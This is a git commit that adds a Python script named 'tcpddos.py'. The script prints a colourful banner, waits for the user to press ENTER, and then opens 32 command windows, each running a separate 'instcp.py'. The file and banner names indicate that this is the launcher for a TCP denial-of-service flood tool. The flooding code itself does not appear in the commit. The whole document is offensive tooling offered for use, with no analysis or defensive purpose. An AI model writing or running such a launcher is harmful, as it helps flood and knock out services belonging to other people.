750022398ed6ae0a000c7cc10dc962b346274fe3
newark <142625255+tayko9222@users.noreply.github.com>
2023-09-04 15:14:41 +0200

    Add files via upload

---
+++ tcpddos.py
@@ -0,0 +1,72 @@
+import socket, requests
+import random
+import threading
+import time
+import os
+import pystyle
+import colorama
+import colored
+import smtplib
+import requests
+import platform
+import sys
+import webbrowser
+from tqdm import tqdm
+from colored import *
+from pystyle import Colors, Colorate
+from colorama import *
+
+
+print(Fore.CYAN + "  ____  ___  ____    ____  _____  ___ ")
+print(Colors.red, "(_  _)/ __)(  _ \  (  _ \(  _  )/ __)")
+print(Colors.orange, "  )( ( (__  )___/   )(_) ))(_)( \__ \ ")
+print(Fore.BLUE + "  (__) \___)(__)    (____/(_____)(___/")
+print(f"{Fore.YELLOW}                             [{Fore.BLUE}v.12345{Fore.YELLOW}] ")
+print("")
+print("")
+print("")
+print("")
+print(f"{Fore.CYAN}[",end=''), print(f'{Fore.RED}!', end=''), print(f"{Fore.CYAN}] ", end='') , print(f'{Fore.RED}Please press ENTER ', end=''), print(f"{Fore.CYAN}")
+input(" > ")
+print("")
+
+print(f"{Fore.CYAN}[", end=''), print(f'{colored.fg(243)}+', end=''), print(f"{Fore.CYAN}]", end=''), print(Colors.gray, " Info : Multi", end=''), print(f"{Fore.CYAN} window", end=''), print(Colors.gray, " are going to open")
+time.sleep(2.3)
+
+if platform.system().startswith("Linux"):
+    os.system('clear')
+elif platform.system().startswith("Windows"):
+    os.system('cls')
+
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
+os.system("start cmd /k python instcp.py")
